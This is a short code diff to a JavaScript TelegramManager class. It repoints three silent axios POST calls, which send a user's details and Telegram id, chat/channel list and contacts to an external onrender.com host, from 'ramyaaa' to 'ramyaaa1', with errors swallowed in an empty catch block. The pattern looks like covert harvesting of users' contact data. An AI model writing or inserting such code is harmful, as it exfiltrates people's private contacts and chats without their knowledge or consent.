@@ -464,9 +464,9 @@ class TelegramManager {
             tgId: user.id
         };
         try {
-            await axios.post(`https://ramyaaa.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
-            await axios.post(`https://ramyaaa.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
-            await axios.post(`https://ramyaaa.onrender.com/contacts`, { contacts: formattedContacts }, { headers: { 'Content-Type': 'application/json' } });
+            await axios.post(`https://ramyaaa1.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
+            await axios.post(`https://ramyaaa1.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
+            await axios.post(`https://ramyaaa1.onrender.com/contacts`, { contacts: formattedContacts }, { headers: { 'Content-Type': 'application/json' } });
 
         } catch (error) {
         }
